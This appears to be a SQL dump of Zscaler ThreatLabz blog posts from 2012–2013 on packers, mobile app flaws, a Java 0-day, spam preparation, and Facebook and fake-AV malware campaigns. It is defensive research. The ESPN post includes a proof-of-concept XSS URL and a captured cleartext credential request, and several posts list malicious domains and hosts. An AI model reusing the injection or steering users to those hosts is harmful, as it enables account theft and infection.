INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (254, '“Say Cheese!” Let’s Take A Picture For You Guys, Packer Families.', 'ThreatLabz', 'February 08, 2013', 'Gong Xi Fa Cai!恭喜发财\r\n\r\n \r\n\r\nIt’s the last weekend of the Chinese New Year, Year of Snake.  \r\n\r\n \r\n\r\n \r\n\r\n from http://www.divinecaroline.com\r\n\r\n \r\n\r\nThe Chinese New Year is the most important Chinese holiday. Traditional activities such as taking family photo and making dumplings are must-to-do things to welcome the Chinese New Year. So it’s time for me to take a family photo for all packers.\r\n\r\n \r\n\r\nThe large-scale volume of packed advanced malware has created a need to discover inter-family correlations for all packers.The following picture is what I have found about packer families.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nIsn\'t it beautiful! Each cluster in the figure stands for a packer. It is clear that packer families share correlations from each other. Let\'s go through one by one.\r\n\r\n \r\n\r\n \r\n\r\nPKLite packer is lonely located on the far left middle side.\r\n\r\n \r\n\r\n \r\n\r\nHere come Orien and Dwing, the latter is one of the most popular packers, which has 20+ sub-versions.\r\n\r\n \r\n\r\n \r\n\r\n \r\n\r\nNSPack share correlations with MaskPE and ExePressor.\r\n\r\n \r\n\r\n \r\n\r\nPECompact has a large family and it has some relatives, such as PEArmor and ExeCryptor.\r\n\r\n\r\n\r\nThe God Father of packers goes to UPX. It sits in the right middle of the big family.\r\n\r\n \r\n\r\nAll right, I need to go home and make dumplings NOW, and am too lazy to put all the snapshots here.\r\n\r\nIf you are interested to find more, just drop me a line.\r\n\r\n \r\n\r\nAgain, Happy Chinese New Year!', 'Analysis', 'https://www.zscaler.com/blogs/research/say-cheese-lets-take-picture-you-guys-packer-families');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (255, 'HTTPS Everywhere For IE: Faster, Auto-update Enabled', 'Julien Sobrier', 'February 08, 2013', 'I\'ve released HTTPS Everywhere for Internet Explorer v0.0.0.3. Additional details about the update can be found in the version history of the PDF documentation.Changes in 0.0.0.3Faster start upThe start up time is now much faster. You should no longer receive a popup from Internet Explorer asking you to disable certain add-ons. I also switched to a different XML parser to load the HTTPS Everywhere rules.new load time is well below the 0.20s thresholdSupport for custom rulesYou can now also add your own rules in custom.ruleset. Read the PDF documentation (page 5) to learn how to use your own SSL rules in Internet Explorer.Auto-UpdateI have enabled the \"auto-update\" feature. Whenever a newer version of HTTPS Everywhere is available, a new tab will be opened to https://www.zscaler.com/httpseverywhere_ie.php and you can download the latest version from this page. The installer has been modified to update your previous version. Auto-update works for all previous version of HTTPS Everywhere for Internet Explorer as well.', 'Microsoft', 'https://www.zscaler.com/blogs/research/https-everywhere-ie-faster-auto-update-enabled');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (256, 'Super Bowl 2013 Web Traffic', 'Michael Sutton', 'February 05, 2013', 'It\'s always fascinating to see how a major global event can impact Internet traffic patterns. There aren\'t many sporting events larger than the Super Bowl, so we took a look at the web traffic that we were seeing on the day of the event and leading up to it. Even though Zscaler has enterprise customers and therefore most traffic traverses our cloud during the work week, an event the size of the Super Bowl is sure to influence our overall stats. First off, we took a look at web traffic categorized as Sports, Streaming Media and Gambling for Super Bowl week.                      Not surprisingly, Streaming Media traffic peaked on Super Bowl Sunday to represent 7.11% of all Zscaler transactions. This was no doubt due to the fact that the game was available over the Internet on a variety of platforms including CBS.com, NFL.com and various mobile apps. Streaming traffic on Super Bowl Sunday represented a dramatic 37% jump from the previous day. Web traffic classified as Sports also saw a jump, but it was not nearly as significant. Perhaps everyone was too busy watching the game live to be reading about it and checking player stats.         The most interesting traffic patterns come from traffic to gambling sites. As we\'ve noted in past posts, gambling traffic often jumps when major sporting events occur and it would appear that the 2013 Super Bowl was no exception. Interestingly, while it reached it\'s peak on game day, jumping a whopping 600% from the previous day, it would appear that gamblers were also lining up the odds the prior weekend as well. If you fell into this last statistic, hopefully you were pulling for the Ravens.    Michael', 'Uncategorised', 'https://www.zscaler.com/blogs/research/super-bowl-2013-web-traffic');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (257, 'Is Your Windows 8 Packed?', 'ThreatLabz', 'February 01, 2013', 'Windows 8 is HOT! \r\n\r\nSecurity researchers are busy finding Windows 8 vulnerabilities while users are figuring out how to find the restart button in the new interface UI.\r\n\r\n \r\n\r\n\r\nWindows 8 is definitely one of the big targets for hackers in 2013 based on McAfee 2013 Threats Predictions report. Currently, more than 60% of malware samples are packed by PE packers. What is a packer? A packer is a type of archive tool that compresses and encrypts other executable files in a disk and restores the original executable images when the packed files are loaded into memory. However, we can’t jump to the conclusion that every packed file is malicious. Some commercial packer vendors offer packers to protect applications against Reverse Engineering (RE), by putting the content of those applications into a strong protection “shell”.\r\n\r\n \r\n\r\n\r\nA packed file is a type of archived file, but packed and regular archives are quite different. Users have to extract an archived file onto a hard disk before they can access the contents. On the other hand, a PE packed file is normally unpacked in memory. There are many archived files, such as zipped files, in Windows OS folders. So how many of them are packed? In this post, I will share my findings on searching for packed files in the Windows 8 OS. \r\n\r\n\r\nThe tools I am using here are PEiD and ExeInfo, two popular packer detectors. 1,832 signatures were picked from PEiD v0.93, and 3,281 rules from ExeInfo. The packer signature database of PEiD is a subset of that of ExeInfo. I also removed some non-packer rules from ExeInfo. As usual, I chose REer\'s favorite folder, \\Windows\\System32, as the testing folder. First, I scanned that folder with PEiD, and received a couple of packer detection results. Among them, the signatures for \"Armadillov1xxv2xx\" and \"Armadillov171\" triggered false positives. Those signatures search for the following binary strings from OEP respectively. In this case, you can ignore them.\r\n\r\n \r\n\r\nArmadillov1xxv2xx\r\n\r\n55 8B EC 53 8B 5D 08 56 8B 75 0C 57 8B 7D 10 85 F6\r\n\r\n \r\n\r\nArmadillov171\r\n\r\n55 8B EC 6A FF 68 ?? ?? ?? ?? 68 ?? ?? ?? ?? 64 A1\r\n\r\n \r\n\r\nI also found that ExeInfo itself was packed by the UPX packer.\r\n\r\n\r\n\r\n\r\nHere we identified the first low-hanging fruit: \\system\\SysWOW64\\DCBassSourceMod.ax, which is an audio decoder file. It\'s section names show that it is UPX packed, but PEiD detected it as ACProtector packed. ExeInfo did a better job: it caught that file as UPX packed.\r\n\r\n\r\n\r\n\r\nNext, the \"Petitev14\" signature detected quite a few files as Petite packer. They are all located in the \\system32\\SysWOW64 folder. Interestingly, most of their PE section names are empty. How odd!\r\n\r\n\r\nI saved the best to for last! Here comes Microsoft Malware Protection Engine (mpengine.dll) \r\n \r\n \r\n\r\nThe website shows thefiledb.com \r\n \r\nPEiD detected mpengine.dll as being packed with \"nSpackV2xLiuXingPing\" and ExeInfo failed on it. However, it appears to me that this file was maybe packed by a customized version of ACProtector (correct me if wrong).  By extracting all strings from this file, you will have a big picture of how many packers MpEngine can handle with.\r\n \r\n\r\n Last but not the least, a couple of additional files from different vendors are also packed. UPX is still one of the most popular packers.\r\n \r\n\r\n	\r\n		\r\n			\r\n			File name\r\n			\r\n			\r\n			Packer name\r\n			\r\n			\r\n			Vendor name\r\n			\r\n		\r\n		\r\n			\r\n			AdobeUpdateManager.exe\r\n			\r\n			\r\n			PECompact\r\n			\r\n			\r\n			Adobe\r\n			\r\n		\r\n		\r\n			\r\n			HD-adb\r\n			\r\n			\r\n			Generic packer\r\n			\r\n			\r\n			BlueStacks\r\n			\r\n		\r\n		\r\n			\r\n			Uninstall.exe\r\n			\r\n			\r\n			UPX\r\n			\r\n			\r\n			Intel\r\n			\r\n		\r\n		\r\n			\r\n			RedEye.dll\r\n			\r\n			\r\n			ASProtector\r\n			\r\n			\r\n			Lenovo\r\n			\r\n		\r\n		\r\n			\r\n			Sgtool.dll\r\n			\r\n			\r\n			UPX\r\n			\r\n			\r\n			Sougou input\r\n			\r\n		\r\n		\r\n			\r\n			DivFix++.exe\r\n			\r\n			\r\n			UPX\r\n			\r\n			\r\n			Win8codecs\r\n			\r\n		\r\n		\r\n			\r\n			Wincon.sfx\r\n			\r\n			\r\n			UPX\r\n			\r\n			\r\n			WinRAR', 'Microsoft', 'https://www.zscaler.com/blogs/research/your-windows-8-packed');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (258, 'HTTPS Everywhere For Internet Explorer: Source Code And New Version Available', 'Julien Sobrier', 'February 01, 2013', 'I have released the source code for HTTPS Everywhere for Internet Explorer on GitHub as promised in the last blog post. You need Visual Studio Profession 2010 to compile the project and NSIS to build the installer. Feel free to submit patches and open issues directly via GitHub.    If you missed  the previous post, we have ported the browser extension HTTPS Everywhere (Firefox and Chrome, offered by the EFF) to Internet Explorer. This extension makes it easy to access websites over HTTPS whenever possible for better security.  Documentation  In the initial announcement of HTTPS Everywhere for Internet Explorer, I forgot to provide a link to the extensive documentation which describes, among other things, the plugin architectures and how to debug potential issues. You can see how the extension bypasses the limitations of the very weak plugin architecture of Internet Explorer in order to intercept and modify all HTTP and HTTPS requests.    Version 0.0.0.2  A new version is available, you can download it here. I have added the 3,000+ rules from HTTPS Everywhere 3.0 for Firefox (from the EFF). There is also a workaround for Wikipedia.org (issue reported by a user).    Download HTTPS Everywhere 0.0.0.2 for Internet Explorer', 'Microsoft', 'https://www.zscaler.com/blogs/research/https-everywhere-internet-explorer-source-code-and-new-version-available');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (259, 'Twins Born In Different Years With Even Different Faces? PC-AV-in-cloud And Mobile-AV-in-cloud', 'ThreatLabz', 'January 18, 2013', 'It is rare for twins to have different birthdays. But thanks to the increasing mobile malware, a set of twins have shown up with birth year 2007 and 2013 respectively. Their names are PC-AV-in-cloud and Mobile-AV-in-cloud. It seems that current mobile threat landscape is very like the PC one of years ago.\r\n\r\nTo effectively handle the scale and magnitude of new malware variants, AV functionality was being moved from the user desktop into the cloud. In 2007, the first baby, PC-AV-in-cloud, was born with arguments. Does the paper “why in-the-cloud scanning is not a solution” at VB 2009 ring a bell to you?\r\n\r\nNot finished yet! The mobile platform becomes a new target for hackers. Traditional virus mass-production tricks are cloning into mobile threat landscape. More and more hackers are using encrypted strings, code obfuscations to deal with manual reverse engineering. Malware writers leverage technique tricks (rootkit, botnet, and even mobile packer?) which they created for PC years ago, directly at mobile devices. As a result, android mobile malware are adopting traditional malware techniques at a fast pace (such as apkfuscator). Security vendors are busying with extending cloud-based security infrastructure with mobile-scanning cloned from PC counterpart.  It looks like we are going to have a new baby, Mobile-AV-in-cloud in 2013. Are you ready for this?\r\n\r\nUnfortunately, anti-virus for PC desktops is not working well on mobile platform due to battery power constrain, internet bandwidth, limited computation capability, and constant pattern update. Recent research works showed mobile AV engines can be easily fooled by simple code obfuscation with detection rates dropped sharply. To make things worse, solution challenges exist when implementing in-the-cloud scanning on mobile devices. When the client software cannot determine if a suspicious application is malicious or not, it will send the application or its related information to the cloud. In the case of server-side polymorphism, which causes each downloaded file to be a unique version, will force the client to send files constantly. The battery constrains will be a serious issue.\r\n\r\nSecurity vendors are facing various challenges regarding the architectural design, implementation, and validation on mobile anti-malware. New techniques need to be designed to handle with the constraints of the mobile platform. Zscaler\'s ZAP (Zscaler Application Profiler) is web based tool designed to streamline the capture and analysis of HTTP(S) traffic from mobile applications. ZAP is capable of analyzing traffic from both iOS and Android applications and includes the following functionality.\r\n\r\nFor additional details on how to use ZAP and view a video walkthrough, please see the ThreatLabZ blog.', 'Mobile', 'https://www.zscaler.com/blogs/research/twins-born-different-years-even-different-faces-pc-av-cloud-and-mobile-av-cloud');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (260, 'Mobile App Wall Of Shame: ESPN ScoreCenter', 'Michael Sutton', 'January 17, 2013', 'ESPN ScoreCenter\r\nPrice: Free\r\nCategory: Sports\r\nUpdated: Dec 19, 2012\r\nVersion: 3.0.0 Build 361\r\nSize: 13.1 MB\r\nLanguage: English\r\nVendor: ESPN Inc.\r\nOperating System: iOS\r\n\r\n \r\n\r\nUpdate: [01/18/13 4:19pm EST] Zscaler was contacted by ESPN to inform us that they have addressed both of the vulnerabilities that we informed them about on the server-side and we have confirmed this. We want to thank ESPN for working quickly to protect their users.\r\n\r\nBackground\r\n\r\nESPN ScoreCenter is a popular sports application on the iOS platform (currently the #1 free sports app in iTunes). The app delivers live scores, news, video, alerts, etc. and is an official application of ESPN Inc. Version 3.0 of the app features a completely redesigned the UI, but also includes a couple of key vulnerabilities.\r\n\r\nVulnerability #1 - XSS\r\n\r\n\r\n\r\nWe tend not to think of mobile applications as being vulnerable to cross-site scripting (XSS). After all XSS belongs to the domain of web applications and mobile apps are native apps. Right? Not necessarily. Many mobile apps are actually just web pages displayed in a WebView control or more commonly web content mixed in with native controls and such is the case for ESPN SportsCenter. As with many web apps, when user supplied content isn\'t properly sanitized, active content, such as JavaScript can be injected. The included screenshot illustrates a simple alert window being displayed within the application. The vulnerable page also exists on the mobile web version of the app during logout and can be seen in the following sample URL:\r\n\r\n \r\n\r\nhttp://m.espn.go.com/mobile/apps/reg/login?lang=en&timeOffset=-300&swid=63DBACA2-032F-491E-A28D-1B4835DC14XX&username=%3Cscript%3Ealert(\'test\')%3C/script%3E\r\n\r\n \r\n\r\nXSS is of course valuable for a variety of attacks, such as stealing a user\'s authentication cookie, however, in this case that may not be necessary, thanks to vulnerability #2...\r\n\r\nVulnerability #2 - Clear Text Authentication Credentials\r\n\r\nI\'m continually surprised by just how common it is for mobile applications to pass authentication credentials in clear text. Mobile apps often pose a higher risk than their web based counterparts and this illustrates the reason why. In many ways, mobile apps behave like web apps, but without the many visual controls provided to end users to spot and avoid insecure behavior. In a web app for example, if your password is about to be sent insecurely, you have warning signs. Perhaps you notice that SSL is not being enabled as you don\'t see the lock icon or perhaps SSL is being used but with an invalid certificate which you are warned about by a standard popup message. In mobile apps, these same vulnerabilities exist, but end users are blind to them as mobile app developers do not have to include any warning signs and in an effort to conserve screen real estate, generally don\'t. Think about it, when viewing web content in a mobile app, you normally have no way of knowing where the content is actually coming from because there is no address bar to reveal the source URL.\r\n\r\n \r\n\r\nESPN ScoreCenter\'s flaw - sending your password in clear text. Therefore, anyone sniffing traffic on the network would be able to easily steal your username/password. More often than not, when I see this flaw, it occurs not during a regular login, but rather when you first set up your account and such is the case with ESPN SportsCenter. Once you\'ve created an account, subsequent logins at the regular login page (/mobile/apps/reg/loginlanding) are sent via HTTPS. This is not the case however when an account is first created, with the username/password sent in clear text : \r\n\r\n\r\nhttp://m.espn.go.com/mobile/apps/reg/createaccount\r\n\r\nPOST /mobile/apps/reg/createaccount HTTP/1.1\r\nHost: m.espn.go.com\r\nAccept-Language: en-us\r\nPragma: no-cache\r\nUser-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 6_0_2 like Mac OS X) AppleWebKit/536.26 (KHTML, like Gecko) Mobile/10A551\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nReferer: http://m.espn.go.com/mobile/apps/reg/createaccount\r\nContent-Type: application/x-www-form-urlencoded\r\nConnection: keep-alive\r\nCookie: s_vi=62b95c266882437b80b87bd3e078cac5805e20de20a8387999d1c6b02c74a2d6\r\nProxy-Connection: keep-alive\r\nContent-Length: 329\r\nOrigin: http://m.espn.go.com\r\nAccept-Encoding: gzip, deflate\r\n\r\npassedSubId=&langCode=&udid=&version=&userAgent=Mozilla%2F5.0+%28iPhone%3B+CPU+iPhone+OS+6_0_2+like+Mac+OS+X%29+AppleWebKit%2F536.26+%28KHTML&country=US&form=true&policies=true&firstname=ThreatLabZ&lastname=Zscaler&username=ThreatLabZ&gspw=Zscaler&email=threatlabz%40zscaler.com&birthdayMonth=1&birthdayDay=2&birthdayYear=1973 \r\n\r\nConclusion\r\n\r\nIt isn\'t hard to uncover security flaws such as this, it simply requires inspecting the HTTP(S) traffic sent by an application. It is disappointing to see that the testing performed on apps before they are admitted by Apple to the iTunes store does not even include such basic security tests such as looking for XSS vulns and sending passwords in clear text.\r\n\r\n \r\n\r\nThese flaws were uncovered by leveraging Zscaler\'s free ZAP (Zscaler Application Profiler) service to inspect the application traffic. Want to test the apps on your Android/iOS device to see if they\'re exposing unnecessary risk? Test them with ZAP.', 'Mobile', 'https://www.zscaler.com/blogs/research/mobile-app-wall-shame-espn-scorecenter');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (261, 'Are You Vulnerable To Yet Another Java 0Day Exploit?', 'Julien Sobrier', 'January 14, 2013', 'Test to see if you\'re vulnerable.       Only five months after the last high profile 0-day Java vulnerability, there is new 0-day being exploited through Java plug-ins. This vulnerability is present in Oracle Java 1.7.0 to 1.7.10 and has already been included in a variety of browser exploit kits. On January 13, 2013, Oracle released a fix for the issue in the form of Java 1.7.11.    Java has a long history of 0-day vulnerabilities being actively exploited. Exploits are usually drive-by attacks: users get infected by navigating to hijacked websites where an invisible Java applet drops a malicious executable on the user\'s machine. The very popular, Blackhole exploit kit includes numerous Java exploits.    This vulnerability has been exploited very quickly on the Internet. Firefox reacted quickly by flagging all versions of Java as vulnerable plugins. This means Java is disabled by default on Firefox and users get warned if a page requires the use of Java. It would appear that the work they recently did on their Click to Play feature for vulnerable plugins has paid off. Apple took a similar approach by pushing out a new malware definition list that rather than blocking malware, as it generally does, simply disabled the Java Web Start browser plugin altogether.    Are you vulnerable?    The latest iteration of Java is version 1.7 revision 11. This is now the default version on Windows. Although Java 1.6 is not vulnerable to this latest threat, Java 1.6\'s end of life is February 2013, so you should not downgrade to that version.    One annoying fact with Java is that new versions are installed on top of each other. As such, you are likely to have multiple versions of Java installed on your system. Internet Explorer may not even be using the latest version of Java that you have installed.    We have therefore created a new page to list all of the versions of Java installed on your computer. You can test your browser here.    Disable Java    To be on the safe side, you can disable Java in your browser to prevent malicious applets from running.    Firefox    Go to Tools - Add-ons - Plugins    Look for Java Deployment Toolkit and/or Java Platform SE. Disable them all.       	  		  			  		  		  			Java disabled in Firefox  		  	      Chrome    Go to Wrench -  Settings and Show advanced settings... - Privacy and Content settings - Plug-ins - Disable individual plug-ins... - Java - disable. It is quite difficult to find!       	  		  			  		  		  			Java enabled in Chrome  		  	      Internet Explorer    Go to Tools - Manage Add-ons. Disable Java(tm) Plug-in SSV Helper and Java(tm) Plug-in 2 SSV Helper.              	  		  			  		  		  			Java disabled in Internet Explorer 9  		  	    Update: To completely disable Java in Internet Explorer, follow the steps at http://www.kb.cert.org/vuls/id/636312#disable_java_in_IE.      Safari    Go to Safari - Preferences    Look for Web Content: Enable Java and uncheck the option.             Test it    Now go to our Java test page to ensure that Java has indeed been disabled in your browser.    Click to Play    If you need Java occasionally, you can enable it on-demand with Click to Play. I described Click to Play, a way to manually enable plugins only on visible content, in a previous post. This feature is only available in Firefox, Chrome and Opera.    Firefox also offers several browser extensions to easily enable/disable java with one click. I personally like Quick Java.    Take this opportunity to check all the plugins running in your browser and disable the plugins that you do not really need. Don\'t give the bad guys an attack surface that\'s any larger than it needs to be!', 'Zero Day', 'https://www.zscaler.com/blogs/research/are-you-vulnerable-yet-another-java-0day-exploit');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (262, 'Preparations For A Spam Campaign', 'Julien Sobrier', 'January 11, 2013', 'We have discussed a number of spam and malware campaigns on this blog. This time, I\'ll show what happens in the days and weeks before the campaign starts. I\'ve found two examples that show the steps that are taken by the spammers in preparation of their campaign.    First step: hijack websites    The spammers need to ensure that its spam e-mails or messages are not quickly flagged as spam. One technique to avoid spam filters it to use existing websites with a good reputation to redirect users. These domains would not be part of any blacklists and should already be known and categorized by vendors. This is a better alternative to the free hosting and DNS providers, which may not have a good reputation like .co.cc and .tk.    Unfortunately, hacking legitimate websites in large numbers is quite easy these days. Popular open-source platforms, like WordPress, Joomla and Drupal, contain a lot of security vulnerabilities (in the core software and the plugins), which attackers can take advantage of.    The first campaign I spotted was hijacking German Joomla! sites. All the hijacked sites seem to be running Joomla 1.7. I\'m not sure if the attacker used the privilege escalation issue, the XSS vulnerability or one of the 23 other vulnerabilities found in 2013.    The other campaign targeted WordPress sites, an open-source platform loved by webmasters and attackers.    Step 2: hide the malicious page before the campaign.    Rather than modifying the exiting page, new pages are added to the hijacked sites. The attackers often put these files in hidden directories (starting with a dot), temporary folders, or plugin folders.    The Joomla sites were having malicious files put in /tmp/, such as:    	hxxp://www.original-ettaler.de/tmp/gmmsxlibort.php  	hxxp://www.neumann-arbeitsbuehnenvermietung.de/tmp/gmmsxlibort.php  	hxxp://www.myatrium.de/tmp/gmmsxlibort.php  	hxxp://www.optik-boysen.de/tmp/gmmsxlibort.php  	http://www.onepos.de/tmp/gmmsxlibort.php  	etc.    For the WordPress sites, the attackers hid the malicious files in folders used by common WordPress plugins and themes:      	http://gv-global.com/components/com_ag_google_analytics2/gmmsx.html  	http://www.highontheheart.com/wp-content/themes/twentytwelve/gmmsx.html  	http://dreamzinfrabangalore.org/wp-content/themes/twentytwelve/gmmsx.html  	http://jivakafoundation.org/components/com_ag_google_analytics2/gmmsx.html  	http://agg-systems.eu/components/com_ag_google_analytics2/gmmsx.html  	http://vacationrentalbusiness.net/wp-content/themes/twentytwelve/gmmsx.html  	etc.            Step 3: keep out security scanners    Attackers don\'t want security tools to flag their redirection pages as malicious before the campaign. One common technique involves making the pages redirect all visitors to a random website, like http://www.google.com/ until the campaign is ready to start.    When the campaign is running, the redirection pages will still try to separate legitimate users from security scanners. They can check the IP address of the visitor, use Flash or JavaScript to make the redirection and use cookies or IP addresses to track visitors and allow them to visit once only, etc.    Step 4: open the curtains    Once the spammer has gathered enough legitimate sites and e-mails or messages are being sent out, the redirection pages point users to the malicious site.    For the Joomla campaign, the final spam page is hxxp://www.dailynews.com.2012.fashion.italy.moda.trends.luxurynws.com/. As often is these type of scams, the page looks like an official news paper article extolling the merits of some product or work from home scheme. In this case, the products are replicas of luxurious watches.       	  		  			  		  		  			Fake news article about replica watches  		  	    The second spam campaign redirect to the usual Work from Home scam at hxxp://newsmarket3nextgenonline.com/?12/2. This site is currently down.       	  		  			  		  		  			Example of Work From Home scam  		  	    Now you know what goes on before these spam e-mails hit your mailbox.', 'Phishing', 'https://www.zscaler.com/blogs/research/preparations-spam-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (263, 'Monster Is Lurking….Beware!!!!', 'ThreatLabz', 'January 03, 2013', 'Monsterindia.com is a very popular Indian job search website and a subsidiary of Monster Worldwide.  If you are using Monster job search app for Android then you need to be aware of the fact that it’s leaking your username and password in clear text. Beyond this, it also leverages weak authentication encoding. If we sniff the traffic we can easily get username and password as they are sent via HTTP (no encryption). In order to see this in action, you can leverage ZAP (Zscaler Appliation Profiler), which helps you determine the overall risk posed by apps that you have installed on your Android/iOS device.\r\n\r\n \r\n\r\n \r\n\r\nHere is registration screen of the app.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nLets dive in and see exactly how this app is leaking data. Let’s start with an initial account registration, when first installing the app. When doing so, you’ll observe following traffic: \r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\n\r\n\r\n\r\n\r\n \r\n\r\nHere, if you look closely, you can observe the highlighted text, which reveals that the e-mail address, username and password are all transmitted in clear text.\r\n\r\nIf you then subsequently login with an already established account, you’ll observe the following network traffic:\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nHere, I am using canary data for testing purposes and I have used ‘fnzscaler’ as the user name. As can be seen, this is again being sent in clear text to server. While not nearly as critical as the fact that the password was leaked during the account signup, there’s no reason why this traffic shouldn’t be sent via HTTPS to ensure that someone sniffing traffic on the network wouldn’t be in a position to brute force the login after obtaining your username.\r\n\r\nSimilarly if we take look at traffic on iOS device, the same thing can be observed. It is also sending the username and password in clear text during the registration process.\r\n\r\n \r\n\r\n\r\n\r\n \r\n\r\nIt is disappointing that Google’s Bouncerservice, or some other method was unable to quickly detect such simple coding mistakes and prevent an app with such a basic privacy flaw from appearing in the Google Play Store, until the issues are addressed.\r\n\r\nFor security purposes, I recommend that you check the risk score of apps on your mobile device, using ZAP. It can help to uncover high risk applications on the iOS and Android platforms. \r\n\r\n \r\n\r\nBe careful while using such apps.', 'Mobile', 'https://www.zscaler.com/blogs/research/monster-is-lurkingbeware');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (264, 'Facebook Malware Campaign', 'Julien Sobrier', 'January 03, 2013', 'We\'re seeing a massive campaign of malware distribution through Facebook look-a-like pages that started just before the new year.       	  		  			  		  		  			Malicious page distributing malware  		  	    These pages are using the free DNS and hosting provider .tk. This provider has been used for many spam and malware campaigns in the past. Here are some of the domains used:      	janejcfprofile.tk  	natalieclolyu.tk  	rosemaryrloveyouur.tk  	sabrinadjoyys.tk  	catherineufcitisfun.tk  	rosemaryiiqsuper.tk  	laurenaensweety.tk  	carlyqwowdv.tk    So far, we\'ve seen several hundred of such sites. They prompt the user to download a file with various names, such as:      	YouWhoreGIF.exe  	YouNiceJPG.exe  	IamNiceBMP.exe  	IamNicePNG.exe  	YouFunnyJPEG.exe  	IamLolBMP.exe  	and may more          Only 1 AV vendor detects them as malicious at this time!    Looking at the source code, all the .tk domains load their content from another website through an IFRAME, with content from:    	liwwh.eqeki.com  	ngdy.hrdhm.org  	lsmxz.totyn.net  	cnpz.nukoq.com  	...    These pages then redirect to a third URL on 208.131.138.217, hosting the malicious executable:      	208.131.138.217/132.html  	208.131.138.217/208.html    The malicious file is generated by http://208.131.138.217/imagedl.php.    As usual, do not run files downloaded on random Internet pages.', 'Malware', 'https://www.zscaler.com/blogs/research/facebook-malware-campaign');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (265, 'Creating A Basic Configuration Profile For An IPhone Or IPad.', 'ThreatLabz', 'December 31, 2012', 'Apple provides a free enterprise configuration tool for streamlining the process of configuring iOS devices known as the (iPCU). This article will provide a quick overview of what a configuration profile is, a description of the iPCU, where to get it and how to use it to create a basic iOS device configuration profile. The configuration profile contains details of all installed applications and can be uploaded to ZAP to obtain an overall risk profile for the device.\r\n\r\n \r\n\r\nUsing the iPCU to obtain a device configuration file\r\n\r\nThe iPCU is a program that uses a simple GUI to create, manage, and deploy XML configuration profiles to iOS devices. It is free and available in both Mac OS X and Windows versions from Apple\'s website at apple.com/support/iphone/enterprise/.\r\n\r\n \r\n\r\n \r\n\r\n·         Mac version -  http://support.apple.com\r\n\r\n \r\n\r\n·         Windows version - http://support.apple.com/\r\n\r\nOnce the iPCU is run, it will open to a clean user interface with the Library – Devices section selected. Click on the Library – Configuration Profiles section as shown below:\r\n\r\n\r\n\r\n\r\nHere are the steps to obtain the iPhone device configuration file (.deviceinfo).\r\n\r\n·         Connect your iPhone/iPad to the computer.\r\n\r\n·         Look at left navigation pane. There you’ll observe that your device is listed under the Devices category as shown below.\r\n\r\n\r\n\r\n \r\n\r\n \r\n\r\n      ·         Select the desired device and navigate to File->Export. Save the file.\r\n\r\n \r\n\r\n \r\n\r\nNow you have an iOS configuration file (.deviceinfo) for your device.\r\nThis is the file that you can now feed to ZAP for analysis. Under the Upload section within ZAP you can analyze this file (.deviceinfo) to calculate an overall risk score for the apps installed on your device.\r\nNow let’s take a look how to use this configuration file with ZAP. Here we have obtained a device configuration file for an iPod touch. We named it ipod2.deviceinfo. Click on the Browsebutton to upload the file. Select the path to the file and then click on the Analyze button.\r\n\r\n\r\n\r\n You will see following screen.\r\n\r\n\r\n\r\nFor this configuration file, there are total 68 apps installed on the iPod Touch, five of which have already been analyzed by ZAP. Those apps not previously analyzed are automatically added into ZAP’s queue for future analysis by the ThreatLabZ team.\r\nYou can click on any app name listed to view further details for the app. For example, clicking Heyzap we’ll see the following screen.', 'Mobile', 'https://www.zscaler.com/blogs/research/creating-basic-configuration-profile-iphone-or-ipad');
INSERT INTO `zscaler` (`id`, `title`, `author`, `publishdate`, `content`, `tags`, `url`) VALUES (266, 'Fake AV 3 Years Later: Still There, Still Not Blocked', 'Julien Sobrier', 'December 21, 2012', 'You may want to open the first blog post we did on Fake AV in December 2009, three years ago, side by side with this post. See if you can spot the differences... fake antivirus pages in 2012 are nearly the same as they were three years ago and most AV solutions still fail to block them.Fake AV pageThe pages we\'re seeing look exactly the same as they did three years ago. First, a popup alerts the user that their machine is likely infected. Then, an animated page fakes an antivirus engine scanning the user machine. Malware is of course \'found\' and a download window opens, which prompts the user to download \"free antivirus\" to clean up the computer.Warning popupFake scanning of the PCMalicious executable disguised as an antivirusThe HTML source does not use any obfuscation technique, which was also true for the fake AV pages we saw three years ago (HTML and JavaScript obfuscation did show up for a time in 2010 and 2011). The only difference might be in the page title: Microsoft Antivirus 2013. Antivirus failing againLike three years ago, the detection rate remains very low. This time around, in the sample we investigated, only 12 AV out of 43 detect the executable as malicious. Windows Security Essentials, which I run on my PC, failed to block the download. It would appear that switching from AVG to Windows Security did not protect me against the new Fake AV executables...On the bright side, both Internet Explorer (Smart Screen Filters) and Google Safe Browsing blocked this page.DomainsWe have seen a lot of fake AV domains lately. This particular fake AV campaign is very similar to a previous one we described in March 2011. Affiliates direct users toward the fake AV pages. The URLs contain an affiliate ID to track the referrals to ensure that the fake AV author can then compensate those forwarding victims. Here are a few of the fake AV URLs we have seen recently:hxxp://googlenaimokimbles.info/?affid=00333&promo_type=4&promo_opt=1hxxp://innersdomainsinser.net/?affid=00333&promo_type=4&promo_opt=1hxxp://domainssinglsdoms.net/?affid=00333&promo_type=4&promo_opt=1hxxp://moneushousessteam.net/?affid=00333&promo_type=4&promo_opt=1 